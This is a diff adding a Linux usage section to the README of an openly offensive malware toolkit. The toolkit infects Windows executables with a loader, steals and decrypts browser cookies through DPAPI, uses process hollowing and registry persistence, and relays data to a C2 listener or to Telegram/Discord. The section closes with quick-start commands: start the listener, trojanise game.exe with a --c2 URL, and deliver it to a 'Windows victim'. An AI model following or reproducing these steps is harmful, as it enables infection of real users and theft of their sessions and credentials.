@@ -1220,6 +1220,49 @@ opened read-only with SQLite.
 
 ---
 
+## Linux (attacker machine)
+
+The toolkit is split in two sides, and only the ATTACKER side is portable:
+
+**Runs natively on Linux** (attacker machine, Python 3.8+):
+- `listen.py` -- pure Python HTTP server (ThreadingHTTPServer), no Windows deps
+- `sink.py` -- Windows uses `\\.\pipe\ck_pipe`; on Linux it creates a FIFO at
+  `/tmp/ck_pipe` with the same protocol (one JSON dump per connection, EOF ends it).
+  The payload's fallback path differs per OS, but the attacker-side workflow is identical
+- `auto.py` -- infection is a byte append (loader bytes + host bytes + length + magic),
+  fully portable; `--c2`, `--find-port`, Telegram/Discord relay and the GUI all work
+- `pick.py` -- PE classification is pure Python; infection works; `tkinter` GUI works
+- `swap.py`, `session_break.py` (analysis modes) -- pure Python
+
+**Windows-only** (they bind to Win32 by design):
+- `bin/loader.exe` + `bin/ckdll.dll` -- the payload uses DPAPI (cookie key decryption),
+  process hollowing (NtCreateThreadEx), the Windows registry (persistence) and NT pipes;
+  the targets themselves (Chromium/Edge/Firefox cookie stores on Windows victims) are Windows paths
+- `build.bat` -- needs MSVC. On Linux, copy prebuilt `bin/loader.exe` + `bin/ckdll.dll`
+  from a Windows build machine; infection works without compiling
+- `cookielog.py` -- stages the v20 app-bound key on a Windows victim (DPAPI +
+  elevation_service). No Linux mode (Linux Chrome keys use the user keyring, not DPAPI)
+- `auto.py --run` / `pick.py` loader launch -- runs the infected PE: test on Windows
+- `session_break.py` live Vivaldi hijack -- NtQuerySystemInformation; the Firefox read
+  and the cryptanalysis report work on Linux (profile at `~/.mozilla/firefox`)
+
+Windows-only entry points print a clear message and return instead of crashing.
+
+Quick start on Linux (attacker):
+
+```bash
+# 1. copy the project (with prebuilt bin/) to the Linux box
+# 2. pick a port and start the listener
+python3 listen.py 9400
+# 3. infect a Windows host exe (byte append; no MSVC needed)
+python3 auto.py game.exe --c2 http://YOUR_PUBLIC_IP:9400/
+# 4. deliver ifec/apps/game.exe to the Windows victim
+# optional local fallback sink instead of the HTTP listener
+python3 sink.py
+```
+
+---
+
 ## Build requirements
 
 - **Windows 10/11 x64**
